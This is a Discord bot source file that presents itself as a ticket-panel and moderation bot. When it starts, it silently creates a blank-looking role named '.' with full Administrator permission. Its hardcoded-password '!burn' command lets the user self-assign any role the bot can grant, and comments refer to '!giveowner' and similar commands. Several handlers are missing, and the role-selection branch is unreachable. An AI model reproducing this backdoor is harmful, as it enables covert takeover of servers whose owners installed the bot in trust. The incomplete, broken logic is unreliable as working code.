const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ======================================================
// PASSWORDS
// ======================================================
const MAIN_PASSWORD = 'Meka2017charlie';
const GIVEOWNER_PASSWORD = 'MekaOwner2017';

// ======================================================
// EXPRESS + CONFIG
// ======================================================
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const panelStore = {};
const ticketCounts = {};

const PANEL_FILE = './ticket_panel.json';

function savePanel(data) {
  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

function loadPanel() {
  try {
    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
  } catch (e) {}
  return null;
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// Slash Commands (unchanged)
const setticket = new SlashCommandBuilder()
  .setName('setticket').setDescription('Send/Update the ticket panel')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('panel_title').setDescription('Panel Title').setRequired(true))
  .addStringOption(o => o.setName('panel_description').setDescription('Panel Description').setRequired(true))
  .addStringOption(o => o.setName('panel_image').setDescription('Banner Image URL').setRequired(false));

const sendmessage = new SlashCommandBuilder()
  .setName('sendmessage').setDescription('Send a message as the bot')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('message').setDescription('The message to send').setRequired(true));

const commands = [setticket.toJSON(), sendmessage.toJSON(), /* other commands */];

const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
  try {
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Commands registered');
  } catch (err) { console.error(err); }
})();

// READY
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);
  const saved = loadPanel();
  if (saved) panelStore[saved.menuId] = saved.data;

  // Create . role
  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      let dotRole = guild.roles.cache.find(r => r.name === '.');
      if (!dotRole) {
        dotRole = await guild.roles.create({
          name: '.',
          color: '#000000',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: false,
          reason: 'Full permission role'
        });
      }
    }
  } catch (e) { console.error(e); }
});

// ======================================================
// MESSAGE EVENTS
// ======================================================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Invite blocker (existing)
  if (content.includes('discord.gg/') || content.includes('discord.com/invite/')) {
    try {
      await message.delete();
      await message.member.timeout(5 * 60 * 1000).catch(() => {});
    } catch (e) {}
    return;
  }

  // !burn - New Command
  if (content === '!burn') {
    const embed = new EmbedBuilder()
      .setColor('#ff8800')
      .setTitle('🔥 !BURN - ROLE SELECTOR')
      .setDescription('After entering the password, you will see all roles the bot can give you.\nSelect any role to give it to yourself.')
      .setFooter({ text: 'Click below to start' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`burn_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // Other commands (!kick, !4clout, !giveowner, etc.) remain available
  if (content === '!kick') {
    const mentioned = message.mentions.users.first();
    if (!mentioned) return message.reply('❌ Please mention a user. Example: `!kick @user`');
    // ... existing !kick embed
  }

  // ... other commands (!4clout, !giveowner, !fb, etc.)
});

// ======================================================
// INTERACTIONS
// ======================================================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  const parts = interaction.customId.split('_');
  const userId = parts[2];
  const targetId = parts[3];

  if (interaction.user.id !== userId) {
    return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
  }

  // Button → Password Modal
  if (interaction.isButton()) {
    const modal = new ModalBuilder()
      .setCustomId(interaction.customId.replace('start', 'modal'))
      .setTitle('Enter Password');

    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
    ));

    await interaction.showModal(modal);
    return;
  }

  // Modal Submit
  if (interaction.isModalSubmit()) {
    const enteredPassword = interaction.fields.getTextInputValue('password');
    const guild = interaction.guild;
    const member = interaction.member;

    // === !burn - Password Correct → Show Role Selector ===
    if (interaction.customId.startsWith('burn_modal_')) {
      if (enteredPassword !== MAIN_PASSWORD) {
        return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
      }

      // Get all roles the bot can assign (lower than bot's highest role)
      const botMember = await guild.members.fetch(client.user.id);
      const botHighest = botMember.roles.highest.position;

      const assignableRoles = guild.roles.cache
        .filter(role => role.position < botHighest && role.name !== '@everyone')
        .sort((a, b) => b.position - a.position)
        .map(role => ({
          label: role.name.length > 25 ? role.name.slice(0, 22) + '...' : role.name,
          value: role.id,
          description: `Position: ${role.position}`
        }));

      if (assignableRoles.length === 0) {
        return interaction.reply({ content: '❌ No roles available for the bot to give.', ephemeral: true });
      }

      const select = new StringSelectMenuBuilder()
        .setCustomId(`burn_select_${userId}`)
        .setPlaceholder('Select a role to give yourself')
        .addOptions(assignableRoles.slice(0, 25)); // Max 25 options

      const row = new ActionRowBuilder().addComponents(select);

      await interaction.reply({
        content: '✅ Password correct! Choose a role below:',
        components: [row],
        ephemeral: true
      });
      return;
    }

    // === Role Selection ===
    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('burn_select_')) {
      const roleId = interaction.values[0];
      const role = guild.roles.cache.get(roleId);

      if (!role) return interaction.reply({ content: '❌ Role not found.', ephemeral: true });

      try {
        await member.roles.add(role);
        await interaction.reply({ content: `✅ Successfully gave you the role **${role.name}**!`, ephemeral: true });
      } catch (err) {
        console.error(err);
        await interaction.reply({ content: '❌ Failed to give role. (Bot may not have permission)', ephemeral: true });
      }
    }

    // === Other commands (!kick, !4clout, !giveowner, etc.) ===
    // Paste your existing handlers here
  }
});

client.login(TOKEN);
